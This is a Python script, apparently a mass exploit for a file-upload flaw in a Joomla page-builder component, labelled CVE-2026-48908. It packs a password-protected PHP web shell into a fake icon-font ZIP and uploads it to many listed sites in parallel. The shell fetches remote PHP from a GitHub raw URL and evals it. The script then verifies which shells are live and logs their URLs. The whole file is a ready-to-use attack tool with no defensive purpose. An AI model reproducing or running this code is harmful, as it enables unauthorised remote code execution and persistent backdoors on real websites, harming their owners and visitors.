#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import io
import json
import zipfile
import random
import string
import sys
import requests
import time
from threading import Thread, Lock
from queue import Queue

try:
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

lock = Lock()
TIMEOUT_UPLOAD = 15
TIMEOUT_CHECK = 8

def rnd(n=8):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))

def build_zip(name, shell_rel):
    # ===== SHELL BACKDOOR (dari php.txt) =====
    shell_code = r'''<?php
$code = '<?php
session_start();

// Function to get content from a URL
function geturlsinfo($url) {
    if (function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION["coki"])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["coki"]);
        }
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists("file_get_contents")) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in() {
    return isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;
}

if (isset($_POST["password"])) {
    $entered_password = $_POST["password"];
    $hashed_password = "5a61d78a46cd005a3a52bdf08dad60b8";
    if (md5($entered_password) === $hashed_password) {
        $_SESSION["logged_in"] = true;
        $_SESSION["coki"] = "asu";
    } else {
        echo "Incorrect password. Please try again.";
    }
}

if (is_logged_in()) {
    $a = geturlsinfo("https://raw.githubusercontent.com/adenxploit/bypshell/refs/heads/main/p.php");
    eval("?>" . $a);
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title></title></head>
    <body>
        <form method="POST" action="">
            <label for="password">🔐 </label>
            <input type="password" id="password" name="password">
            <input type="submit" value="MASUK">
        </form>
    </body>
    </html>
    <?php
}
?>';

$encoded_code = base64_encode($code);
eval('?>' . base64_decode($encoded_code));
?>'''
    shell_bytes = shell_code.encode('utf-8')
    
    selection = json.dumps({
        "IcoMoonType": "selection",
        "icons": [],
        "metadata": {"name": name},
        "preferences": {"fontPref": {"prefix": "ico-", "metadata": {"fontFamily": name}}}
    }).encode('utf-8')
    
    buf = io.BytesIO()
    z = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
    z.writestr("selection.json", selection)
    z.writestr("style.css", b".ico-x:before{content:'Shin';}")
    z.writestr("fonts/%s.ttf" % name, b"FONT")
    z.writestr(shell_rel, shell_bytes)
    z.close()
    return buf.getvalue()

def upload_zip(url, zip_bytes):
    files = {"custom_icon": ("payload.zip", zip_bytes, "application/zip")}
    try:
        r = requests.post(url, files=files, verify=False, timeout=TIMEOUT_UPLOAD)
        print(r.text[:200])
        return r.status_code, r.text
    except:
        return None, "Timeout/Error"

def check_shell(shell_url):
    try:
        r = requests.get(shell_url, verify=False, timeout=TIMEOUT_CHECK, allow_redirects=False)
        # Cek tanda shell backdoor (form login / password)
        if r.status_code == 200 and ('type="password"' in r.text or 'MASUK' in r.text or 'name="password"' in r.text):
            return True
        return False
    except:
        return False

def clean_text(text):
    try:
        return text.encode('ascii', 'ignore').decode('ascii')
    except:
        return str(text)

def exploit(target_url):
    extensions = ["php", "PHP"]
    
    for ext in extensions:
        shell_path = "fonts/shell." + ext
        
        with lock:
            print("    [*] Trying: %s" % shell_path)
        
        icon_name = "shxt_" + rnd(6)
        zip_data = build_zip(icon_name, shell_path)
        code, resp = upload_zip(target_url, zip_data)
        resp_clean = clean_text(resp)
        
        if code == 200:
            base_url = target_url.split("/index.php")[0]
            shell_url = base_url + "/media/com_sppagebuilder/assets/iconfont/%s/%s" % (icon_name, shell_path)
            
            if check_shell(shell_url):
                with lock:
                    print("    [+] FOUND: %s" % shell_path)
                return True, shell_url, resp_clean[:200]
            else:
                with lock:
                    print("    [-] %s uploaded but not accessible" % shell_path)
        else:
            with lock:
                print("    [-] %s upload failed" % shell_path)
    
    return False, None, "All extensions failed"

def fix_url(url):
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    if "index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon" not in url:
        if url.endswith("/"):
            url = url + "index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon"
        else:
            url = url + "/index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon"
    return url

def worker(queue, result_file, total, counter):
    while True:
        try:
            i, url = queue.get(timeout=1)
        except:
            break
        target = fix_url(url)
        with lock:
            print("\n[%d/%d] %s" % (i, total, target))
        status, shell_url, resp = exploit(target)
        with lock:
            if status:
                with open(result_file, "a") as f:
                    f.write("%s\n" % shell_url)
                print("    [+] OK: %s" % shell_url)
                counter[0] += 1
            else:
                print("    [-] FAIL: %s" % resp)
                counter[1] += 1
        queue.task_done()

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════╗
║   CVE-2026-48908 Exploit - Backdoor Shell             ║
║   Usage:                                              ║
║   py exp2.py list.txt                                 ║
║   py exp2.py list.txt 50                              ║
║   py exp2.py 50 list.txt                              ║
╚════════════════════════════════════════════════════════╝
""")

    if len(sys.argv) < 2:
        print("[-] Masukkan file list!")
        sys.exit(1)

    list_file = None
    num_threads = 20

    if sys.argv[1].isdigit():
        num_threads = int(sys.argv[1])
        if len(sys.argv) >= 3:
            list_file = sys.argv[2]
        else:
            print("[-] File list tidak ditemukan!")
            sys.exit(1)
    else:
        list_file = sys.argv[1]
        if len(sys.argv) >= 3 and sys.argv[2].isdigit():
            num_threads = int(sys.argv[2])

    if not list_file:
        print("[-] File list tidak ditemukan!")
        sys.exit(1)

    try:
        with open(list_file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print("[-] Gagal baca file: %s" % e)
        sys.exit(1)
    
    if not urls:
        print("[-] File list kosong!")
        sys.exit(1)
    
    total = len(urls)
    num_threads = min(num_threads, total)
    
    print("[+] Total target: %d" % total)
    print("[+] Threads: %d" % num_threads)
    print("[+] Extensions: php, PHP")
    print("[+] Result: result.txt")
    print("-" * 50)
    
    result_file = "result.txt"
    q = Queue()
    for i, url in enumerate(urls, 1):
        q.put((i, url))
    
    counter = [0, 0]
    threads = []
    start_time = time.time()
    
    for _ in range(num_threads):
        t = Thread(target=worker, args=(q, result_file, total, counter))
        t.daemon = True
        t.start()
        threads.append(t)
    
    q.join()
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    print("\n[+] SELESAI! (%.2fs)" % elapsed)
    print("    Success: %d" % counter[0])
    print("    Failed: %d" % counter[1])
    print("    Speed: %.2f/s" % (float(total) / elapsed if elapsed > 0 else 0))
